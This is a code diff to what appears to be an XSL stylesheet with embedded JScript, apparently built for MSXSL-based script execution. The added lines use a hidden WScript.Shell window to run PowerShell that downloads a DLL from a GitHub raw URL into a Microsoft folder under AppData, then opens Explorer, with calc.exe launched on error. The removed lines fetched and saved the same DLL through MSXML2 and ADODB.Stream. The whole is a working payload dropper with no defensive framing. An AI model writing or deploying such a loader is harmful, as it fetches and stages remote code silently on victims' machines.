@@ -18,23 +18,15 @@
 			var url = "https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll";
 
 			try {
-				var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-				xhr.open("GET", url, false);
-				xhr.send();
+				var shell = new ActiveXObject("WScript.Shell");
+				var ps = 'powershell -Command "Invoke-WebRequest ''https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/7346832764233279.dll'' -OutFile ''$env:APPDATA\\Microsoft\\7346832764233279.dll''"';
+				shell.Run(ps, 0, true);
+				var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');
 
-				if (xhr.status == 200) {
-					var stream = new ActiveXObject("ADODB.Stream");
-					stream.Type = 1; // adTypeBinary
-					stream.Open();
-					stream.Write(xhr.responseBody);
-					stream.SaveToFile(env, 2); // adSaveCreateOverWrite
-					stream.Close();
-				}
+			}
 			} catch(e) {
 				var r = new ActiveXObject("WScript.Shell").Run('calc.exe');
 			}
-
-    		   var r = new ActiveXObject("WScript.Shell").Run('explorer.exe "C:\"');
 
 		]]>
 	</script>
